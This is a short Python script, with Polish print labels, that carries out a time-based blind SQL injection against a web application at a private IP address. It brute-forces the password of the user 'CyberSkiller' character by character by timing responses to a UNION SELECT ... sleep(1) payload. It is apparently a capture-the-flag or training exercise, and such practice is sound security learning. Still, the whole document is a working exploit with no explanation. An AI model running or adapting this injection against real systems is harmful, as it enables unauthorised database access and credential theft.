import requests

import time

from string import ascii_uppercase

URL = 'http://10.34.40.133/?query=%22+UNION+SELECT+IF%28password+LIKE+%27C{}%25%27%2C+sleep%281%29%2C+%27a%27%29+FROM+users+WHERE+username%3D%27CyberSkiller%27+--+a+'

password = ''

responseTime = 1

for c in ascii_uppercase:
	print('prubuje: ' + c)
	start = time.time()
	r = requests.get(URL.format(c))
	end = time.time()
	if (end - start) >= responseTime:
		password += c
		print('Haslo: ' + password)
		break


for k in range(10):
	for i in range(10):
		print('prubuje: ' + str(k)+ " "+ str(i))
		start = time.time()
		r = requests.get(URL.format(password + str(i)))
		end = time.time()
		if (end - start) >= responseTime:
			password += "" + str(i)
			print('Haslo: ' + password)
			break

print('ostateczne haslo: ' + password)
